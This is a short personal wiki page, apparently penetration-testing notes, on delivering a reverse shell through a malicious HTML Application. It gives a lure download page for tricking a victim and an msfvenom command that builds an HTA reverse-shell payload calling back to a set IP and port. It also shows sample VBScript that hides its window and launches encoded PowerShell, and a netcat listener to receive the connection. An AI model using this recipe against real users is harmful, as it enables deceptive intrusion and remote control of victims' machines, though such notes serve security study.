Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-12T22:47:37-05:00

====== HTML Apps ======
Created Tuesday 12 October 2021

When a page is extended with .hta instead of .html, IE interprets the file as a HTML application. This means it will be executed by the mshta.exe, bypassing IE's security measures.
The user has to accept the execution of the app, but if he does, code that is executed will now run under the privileges of the user.

==== Spawning a shell ====
This process involves setting up a website that serves the HTML APP, and tricking the victim to download and run the HTA.
The HTA contains powershell shellcode that connects back to our machine.

Example website
{{{code: lang="html" linenumbers="True"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Superduper program download</title>
</head>
<body>
    <a href="./superduper.hta">Download this super cool program now!!</a>
</body>
</html>
}}}


Create a payload with msfvenom
{{{code: lang="sh" linenumbers="False"
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.177 LPORT=4444 EXITFUNC=process -f hta-psh -o superduper.hta
}}}
'

The HTA will look something like this:
{{{code: lang="html" linenumbers="True"
<script language="VBScript">
  window.moveTo -4000, -4000
  Set sqnyupmtNZF = CreateObject("Wscript.Shell")
  Set mw89jWr = CreateObject("Scripting.FileSystemObject")
  For each path in Split(sqnyupmtNZF.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If mw89jWr.FileExists(path + "\..\powershell.exe") Then
      sqnyupmtNZF.Run "powershell.exe -nop -w hidden -e "<SNIP>",0
      Exit For
    End If
  Next
  window.close()
</script>
}}}


Setup a listener to receive the reverse connection
{{{code: lang="sh" linenumbers="False"
nc -nvlp 4444
}}}


Fun & Profit

===== See =====
[[Tools:Windows:PowerShell]]
[[Tools:MultiPlatform:NetCat]]
